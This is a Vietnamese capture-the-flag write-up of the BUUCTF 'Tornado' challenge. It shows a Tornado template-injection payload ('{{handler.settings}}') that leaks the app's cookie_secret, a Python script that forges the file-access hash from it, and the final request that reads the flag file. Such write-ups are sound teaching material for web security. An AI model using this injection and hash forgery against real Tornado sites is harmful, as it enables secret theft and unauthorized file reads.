Challenge cho ta 3 luồng dẫn

![image](https://github.com/Llam-a/BUUCTF/assets/115911041/a2a056ea-5309-49dd-8649-72468063f2b7)

```
/flag.txt
flag in /fllllllllllllag

/welcome.txt
render

/hints.txt
md5(cookie_secret+md5(filename))
```

Vậy thì flag thì sẽ ở  `/fllllllllllllag`. Và sau khi mở dường dẫn `/hints.txt` thì 1 method GET thực hiện  nội dung sau `/file?filename=/hints.txt&filehash=40537aea44509546077b9e084731b10f`

Ở đây `filename=/hints.txt` và `filehash=40537aea44509546077b9e084731b10f`.Dựa theo nội dung đường dẫn hints.txt thì `filehash=md5(cookie_secret+md5(filename))`.Ta chỉ còn thiếu `cookie_secret` là solve được bài.

Và ta thầy là GET request luôn tạo bởi file `/file` . Mở đường dẫn đó ta được

![image](https://github.com/Llam-a/BUUCTF/assets/115911041/467d865c-51f2-43c4-b78a-1299b8471faa)

Ta được 1 GET request nữa với tham số `msg=Error`.Theo tên challenge là `Tornado` là framework của python có lỗi SSTI. Mình thử bypass cơ bản bằng cách inject `{{7*7}}`

![image](https://github.com/Llam-a/BUUCTF/assets/115911041/f81abe07-e24a-43f0-a477-eb53d3d22e80)

Kết quả trả về là `ORZ`, mình có thử những cách khác nhưng kết quả vẫn trở về như vậy.Sau khi research về framework tonardo [ở đây](https://www.tornadoweb.org/en/stable/web.html#tornado.web.RequestHandler.settings). Thì khi build web, tonardo có nhiều handler, và tất cả những handler đó đều là subclasses của RequestHandler.

![image](https://github.com/Llam-a/BUUCTF/assets/115911041/b95a0940-4104-490c-ade6-ef634081db81)

Nên `RequestHandler.settings là self.application.settings`.Vậy thì `Handler.settings là RequestHandler.settings`.

Được payload `/error?msg={{handler.settings}}`

![image](https://github.com/Llam-a/BUUCTF/assets/115911041/c9201a69-95e8-4741-b2f6-3275a88a4dab)

Ta đã có `cookie_secret`, giờ chỉ cần dựa theo hint đã cho là ta có được `filehash`

```python
import hashlib
cookie='071f4990-29d5-4229-ad1b-fa68bd367736'
file_filename = '/fllllllllllllag'
md5_filename = hashlib.md5(file_filename.encode(encoding='UTF-8')).hexdigest()
word = cookie+md5_filename
flag = hashlib.md5(word.encode(encoding='UTF-8')).hexdigest()
print(flag)
///output:615ce0a3b27ca20b0733e572504944c9
```

Ta được: `/file?filename=/fllllllllllllag&filehash=615ce0a3b27ca20b0733e572504944c9`

![image](https://github.com/Llam-a/BUUCTF/assets/115911041/e1d7de1c-f269-457a-81d2-65d75a4a40ce)

Read 

https://www.tornadoweb.org/en/stable/guide/structure.html

https://www.tornadoweb.org/en/stable/web.html#tornado.web.RequestHandler.application

https://www.tornadoweb.org/en/stable/web.html#tornado.web.RequestHandler.settings





